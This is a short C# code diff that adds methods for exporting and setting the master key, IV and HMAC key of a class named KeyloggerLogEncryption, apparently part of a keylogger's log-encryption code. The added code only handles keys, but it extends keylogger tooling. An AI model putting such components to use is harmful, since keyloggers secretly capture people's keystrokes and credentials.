@@ -28,6 +28,35 @@ public class KeyloggerLogEncryption
         }
     }
 
+    internal static bool TryExportMasterKey(out byte[] key, out byte[] iv)
+    {
+        key = MasterKey;
+        iv = MasterIV;
+        if (key == null || key.Length == 0 || iv == null || iv.Length == 0)
+        {
+            key = null;
+            iv = null;
+            return false;
+        }
+
+        key = (byte[])key.Clone();
+        iv = (byte[])iv.Clone();
+        return true;
+    }
+
+    internal static void SetMasterKey(byte[] key, byte[] iv)
+    {
+        if (key == null || key.Length == 0 || iv == null || iv.Length == 0)
+        {
+            return;
+        }
+
+        MasterKey = (byte[])key.Clone();
+        MasterIV = (byte[])iv.Clone();
+        MasterHmacKey = DeriveHmacKey(MasterKey, MasterIV);
+        LineCounter = 0;
+    }
+
     public static string EncryptLog(string logData)
     {
         try
